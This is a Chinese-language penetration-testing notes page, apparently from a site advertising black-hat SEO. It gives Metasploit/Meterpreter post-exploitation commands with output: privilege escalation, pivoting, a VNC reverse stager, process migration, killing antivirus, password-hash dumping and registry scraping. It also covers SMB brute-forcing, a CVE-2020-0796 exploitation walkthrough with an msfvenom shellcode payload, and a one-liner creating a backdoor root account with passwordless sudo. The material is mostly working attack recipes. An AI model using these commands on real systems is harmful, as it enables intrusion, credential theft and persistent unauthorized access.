+8. getsystem # 命令尝试将权限提升到本地系统权限或管理员权限
+9. grtuid    # 检查获取的权限等级，服务端用户名返回的是NT AUTHORITY\SYSTEM表示我们成功获得了管理员权限
+10. rev2self # 切换回meterpreter shell 会话中的初始用户账号
+</code></pre>
+<p><img alt="" src="***.com" /></p>
+<pre><code>令牌假冒
+
+a、通过 rurn get_local_subnets 命令，在Meterpreter会话中展示受控系统上本地子网
+b、执行添加路由命令 run autoroute -p 10.180.0.0/16
+c、告知系统将通过远程网络ID（即受控主机的本地网络）通过会话1来进行路由，然后通过route list 命令显示当前活跃的路由设置，可以看到正如预期那样添加了路由
+d、对目标linux系统进行第二次渗透攻击，使用基于Samba的堆溢出漏洞攻击，这个漏洞存在于我们的metasploitable靶机上。攻击成功时，所有的流量都会通过这台受控机器与子网中的其他目标进行通信
+</code></pre>
+<pre><code class="language-bash">meterpreter &gt; run get_local_subnets
+
+[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[!] Example: run post/multi/manage/autoroute OPTION=value [...]
+Local subnet: 10.0.0.0/255.255.0.0
+
+run autoroute -p 10.180.0.0/16
+</code></pre>
+<pre><code>使用meterpreter脚本
+
+1. run vnc 在远程系统上安装VNC会话。然后可以运行screen_unlock命令对目标机器上的桌面进行解锁，这样就能看到目标主机上的VNC窗口（解锁失败）
+2. 进程迁移 可以将meterpreter会话迁移到内存空间中的其它稳定的、不会被关闭的服务进程中，以维持稳定的系统控制连接  run post/windows/manage/migrate 
+3. 关闭杀毒软件 在最新版本的metasploit中推荐使用 run post/windows/manage/killav
+4. 获取密码哈希值  run post/windows/gather/smart_hashdump
+5. 查看目标机上的所有流量   捕获的包都能以.pcap的文件格式存储下来，并能够被wireshark解析 run packetrecorder -i 1
+6. scraper脚本  run scraper 可以列举出你想从系统得到的任何信息，可以攫取用户名和密码，下载全部注册表，挖掘密码哈希值、收集系统信息以及输出HKEY_CURRENT_USER(HKCU)
+</code></pre>
+<pre><code class="language-shell">进入目标机器的shell环境
+meterpreter &gt; shell
+
+# windows shell乱码的解决方案
+shell&gt; chcp 65001
+
+</code></pre>
+<pre><code class="language-shell">需要使用桌面版Kali
+
+meterpreter &gt; run vnc
+[*] Creating a VNC reverse tcp stager: LHOST=10.0.4.144 LPORT=4545
+[*] Running payload handler
+[*] VNC stager executable 73802 bytes long
+[*] Uploaded the VNC agent to C:\Windows\TEMP\rqrSzPhYAwKOS.exe (must be deleted manually)
+[*] Executing the VNC agent with endpoint 10.0.4.144:4545...
+
+
+meterpreter &gt; run post/windows/manage/migrate 
+
+[*] Running module against ADMIN-PC
+[*] Current server process: spoolsv.exe (576)
+[*] Spawning notepad.exe process to migrate into
+[*] Spoofing PPID 0
+[*] Migrating into 2032
+[+] Successfully migrated into process 2032
+
+这里是从 当前进程576 迁移到 进程 2032
+</code></pre>
+<p><img alt="smart_hashdump" src="***.com" />
+<img alt="packetrecorder" src="***.com" /></p>
+<p>```shell script
+meterpreter &gt; run scraper
+[<em>] New session on 10.0.4.147:445...
+[</em>] Gathering basic system information...
+[<em>] Dumping password hashes...
+[</em>] Obtaining the entire registry...
+[<em>]  Exporting HKCU
+[</em>]  Downloading HKCU (C:\Windows\TEMP\tnLjptrz.reg)
+[<em>]  Cleaning HKCU
+[</em>]  Exporting HKLM
+[<em>]  Downloading HKLM (C:\Windows\TEMP\NYKjcbmG.reg)
+[</em>]  Cleaning HKLM
+[<em>]  Exporting HKCC
+[</em>]  Downloading HKCC (C:\Windows\TEMP\qwGxHeUE.reg)
+[<em>]  Cleaning HKCC
+[</em>]  Exporting HKCR
+[<em>]  Downloading HKCR (C:\Windows\TEMP\QDKdXVcx.reg)
+[</em>]  Cleaning HKCR
+[<em>]  Exporting HKU
+[</em>]  Downloading HKU (C:\Windows\TEMP\BRGbnObL.reg)
+[<em>]  Cleaning HKU
+[</em>] Completed processing on 10.0.4.147:445...</p>
+<pre><code>
+
+ref:
+- [kail下使用exploit/windows/smb/ms17_010_eternalblue练习meterpreter](***.com
+- [【漏洞分析】MS 17-010：NSA Eternalblue SMB 漏洞分析](***.com
+- 《渗透攻击红队百科全书》
+- 《Metasploit渗透测试指南（修订版）》
+
+
+### smb 445探测
+
+```shell
+msf6 exploit(multi/samba/usermap_script) &gt; search smb_version
+
+Matching Modules
+================
+
+   #  Name                               Disclosure Date  Rank    Check  Description
+   -  ----                               ---------------  ----    -----  -----------
+   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection
+
+
+Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version
+
+msf6 exploit(multi/samba/usermap_script) &gt; use auxiliary/scanner/smb/smb_version
+msf6 auxiliary(scanner/smb/smb_version) &gt; show options
+
+Module options (auxiliary/scanner/smb/smb_version):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOSTS   10.0.10.65       yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:&lt;path&gt;'
+   THREADS  1                yes       The number of concurrent threads (max one per host)
+
+msf6 auxiliary(scanner/smb/smb_version) &gt; run
+
+[*] 10.0.10.65:445        - Force SMB1 since SMB fingerprint needs native_lm/native_os information
+[*] 10.0.10.65:445        - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (compression capabilities:LZNT1) (encryption capabilities:AES-128-CCM) (signatures:optional) (guid:{927bdfc0-89f0-4623-935a-dd8921fa5ef4}) (authentication domain:DESKTOP-CJQ9OPG)
+[*] 10.0.10.65:445        -   Host could not be identified
+[*] 10.0.10.65:           - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+
+</code></pre>
+<h3 id="smb">smb枚举</h3>
+<pre><code class="language-shell">medusa -h 10.0.0.x -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
+
+nmap -p445 --script smb-brute --script-args userdb=userfilehere,passdb=/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt 10.0.0.x -vvvv
+
+nmap --script smb-brute 10.0.10.x
+</code></pre>
+<h3 id="cve-2020-0796-rce">CVE-2020-0796 RCE</h3>
+<pre><code>别称“永恒之黑”。
+Microsoft服务器消息块（SMB）协议是Microsoft Windows中使用的一项Microsoft网络文件共享协议。
+在大部分windows系统中都是默认开启的，用于在计算机间共享文件、打印机等。Windows 10和Windows Server 2016引入了SMB 3.1.1 。
+本次漏洞源于SMBv3没有正确处理压缩的数据包，在解压数据包的时候使用客户端传过来的长度进行解压时，并没有检查长度是否合法，最终导致整数溢出。
+利用该漏洞，黑客可直接远程攻击SMB服务端远程执行任意恶意代码，亦可通过构建恶意SMB服务端诱导客户端连接从而大规模攻击客户端。
+
+影响范围：
+
+漏洞暂不影响主流的服务器版本，只影响Windows 10 1903之后的各个32位、64位版Windows，包括家用版、专业版、企业版、教育版。（只影响 SMB v3.1.1，1903和1909）
+
+Windows 10 Version 1903 for 32-bit Systems
+
+Windows 10 Version 1903 for ARM64-based Systems
+
+Windows 10 Version 1903 for x64-based Systems
+
+Windows 10 Version 1909 for 32-bit Systems
+
+Windows 10 Version 1909 for ARM64-based Systems
+
+Windows 10 Version 1909 for x64-based Systems
+
+Windows Server, version 1903 (Server Core installation)
+
+Windows Server, version 1909 (Server Core installation)
+</code></pre>
+<p>attacker：10.0.4.145</p>
+<p>victim：10.0.0.64</p>
+<p>iso：<code>ed2k://|file|cn_windows_10_consumer_editions_version_1903_updated_nov_2019_x64_dvd_055b3530.iso|5409650688|EBA2C4E4A7B30C55FA9C042DB7461675|/</code></p>
+<p>1.使用msfvenom生成持久化反弹shell</p>
+<pre><code class="language-bash">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=7777 -b '\x00' -i 1 -f python
+</code></pre>
+<p>输出的buf信息（shellcode）要保存好，后续用于修改exp。</p>
+<p>git clone ***.com</p>
+<p>cd SMBGhost_RCE_PoC</p>
+<p>将其中exploit.py的 USER_PAYLOAD 开头的内容替换为 buf的内容。</p>
+<p>在vim命令行模式下，执行：<code>1:1,%s/buf/USER_PAYLOAD/g</code></p>
+<p>python3 exploit.py -ip 10.0.0.64</p>
+<p>然后攻击机kali进入msfconsole</p>
+<pre><code>msf6&gt; use exploit/multi/handler
+msf6&gt; set payload windows/x64/meterpreter/bind_tcp
+</code></pre>
+<pre><code>-p 指定payload
+
+LPORT 目标主机执行程序后打开的侦听端口
+
+-b 去掉坏字符，坏字符会影响payload正常执行。
+
+&gt; exploit 将生成的payload代码保存到文件exploit中
+
+扩展：\x00 代表16进制的“00”组成的字符串。通过ASCII码换成能识别的就是：&quot;00&quot; - &quot;00000000&quot; - NUL。由于&quot;00000000&quot;是不可见字符，所以代码中没用。
+</code></pre>
+<p>ref:
+- 使用CVE-2020-0796永恒之黑漏洞对win10进行渗透</p>
+<h2 id="centos7">CentOS7提权</h2>
+<p>如果应用有REC还是root权限，可以反弹shell，也可以直接执行命令创建root账户</p>
+<pre><code class="language-shell">sudo useradd test &amp;&amp; echo test:test123 | chpasswd &amp;&amp; sudo usermod -a -G root test &amp;&amp; tee /etc/sudoers.d/test &lt;&lt;&lt; 'test ALL=(ALL) NOPASSWD: ALL'
+</code></pre>
+<p>CentOS7 有root执行权限的可以通过一个命令直接创建普通用户test并提权为root用户，且能免密执行sudo</p>
+<h2 id="ref">REF</h2>
+<ul>
+<li>PoshC2使用</li>
+</ul></div></article><nav class="pager"><a class="pg prev" href="../kali-linux/"><span>上一篇</span><b>Kali Linux</b></a><a class="pg next" href="../brute-force/"><span>下一篇</span><b>暴力破解</b></a></nav>
+        <footer class="site-foot">
+      <p><b>烟雨黑帽SEO工作室</b> · <a href="https://www.heimaoseo.com" rel="noopener">www.heimaoseo.com</a></p>
+      <p>微信：yanyuseo ｜ QQ：81047380 ｜ 邮箱：<a href="mailto:yanyuseo@gmail.com">yanyuseo@gmail.com</a></p>
+      <p>专注搜索引擎优化（SEO）与黑帽SEO技术研究，涵盖整站优化、站群、蜘蛛池、泛目录、快排与流量变现等实战方向，并提供 Web 渗透测试、内网渗透、代码审计等网络安全技术交流。</p>
+      <p class="muted">本站内容仅供安全学习与技术研究，请勿用于非法用途。</p>
+    </footer>
+  </main>
+</div>
+<script src="../assets/app.js?v=1"></script>
+</body>
+</html>
